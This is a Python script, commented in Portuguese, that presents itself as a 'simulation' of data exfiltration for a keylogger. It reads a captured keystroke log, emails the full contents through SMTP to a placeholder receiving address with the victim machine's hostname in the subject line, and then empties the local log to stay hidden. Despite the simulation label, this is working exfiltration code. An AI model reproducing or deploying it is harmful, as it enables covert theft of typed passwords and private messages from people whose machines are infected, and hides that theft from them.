import smtplib
from email.mime.text import MIMEText
from email.mime.multipart import MIMEMultipart
import os

# ----------------------------------------------------------------------
# ATENÇÃO: SCRIPT PARA SIMULAÇÃO DE EXFILTRAÇÃO DE DADOS POR E-MAIL.
# As credenciais são FALSAS e/ou devem ser obtidas de variáveis de ambiente.
# NUNCA SALVE CREDENCIAIS REAIS DIRETAMENTE NO CÓDIGO!
# ----------------------------------------------------------------------

# 1. Configurações de E-mail (Substitua pelos seus dados de teste)
SMTP_SERVER = "smtp.seuprovedor.com" # Ex: smtp.gmail.com
SMTP_PORT = 587
SENDER_EMAIL = "seu.email.falso@teste.com"
SENDER_PASSWORD = "sua_senha_ou_app_password" # Use App Password se for Gmail/Outlook
RECEIVER_EMAIL = "email.alvo.malware@teste.com"

# 2. Definições de Caminho
BASE_DIR = os.path.dirname(os.path.abspath(__file__))
LOG_FILE = os.path.join(BASE_DIR, 'logs', 'keystrokes_log.txt')

def enviar_log_por_email():
    """Lê o arquivo de log e o envia como corpo de um e-mail."""
    
    if not os.path.exists(LOG_FILE) or os.stat(LOG_FILE).st_size == 0:
        print(f"[AVISO] Arquivo de log não encontrado ou está vazio: {LOG_FILE}. Nada a enviar.")
        return

    try:
        # 3. Leitura do Log
        with open(LOG_FILE, 'r') as f:
            log_content = f.read()

        # 4. Construção do E-mail
        msg = MIMEMultipart()
        msg['From'] = SENDER_EMAIL
        msg['To'] = RECEIVER_EMAIL
        msg['Subject'] = f"Keylogger Log - {os.uname().nodename}" # Torna o e-mail furtivo/contextual

        msg.attach(MIMEText(log_content, 'plain'))
        
        # 5. Conexão e Envio (Requer que a segurança do e-mail esteja configurada para permitir apps de terceiros)
        with smtplib.SMTP(SMTP_SERVER, SMTP_PORT) as server:
            server.starttls() # Inicia a criptografia TLS
            server.login(SENDER_EMAIL, SENDER_PASSWORD)
            server.sendmail(SENDER_EMAIL, RECEIVER_EMAIL, msg.as_string())
            
        print(f"\n[SUCESSO] Logs enviados para {RECEIVER_EMAIL} e removidos localmente.")
        
        # 6. Limpeza (Para simular a furtividade e evitar logs duplicados)
        with open(LOG_FILE, 'w') as f:
            f.write('')
            
    except smtplib.SMTPAuthenticationError:
        print("\n[ERRO FATAL] Falha de Autenticação. Verifique E-mail/Senha/App Password e o TLS.")
        print("Certifique-se de que a permissão para 'aplicativos menos seguros' (ou equivalente) esteja ATIVADA.")
    except Exception as e:
        print(f"\n[ERRO] Falha ao enviar o e-mail: {e}")

if __name__ == "__main__":
    print("--- INICIANDO SIMULAÇÃO DE ENVIO DE LOGS (EXFILTRAÇÃO) ---")
    enviar_log_por_email()
    print("--- SIMULAÇÃO DE ENVIO CONCLUÍDA ---")
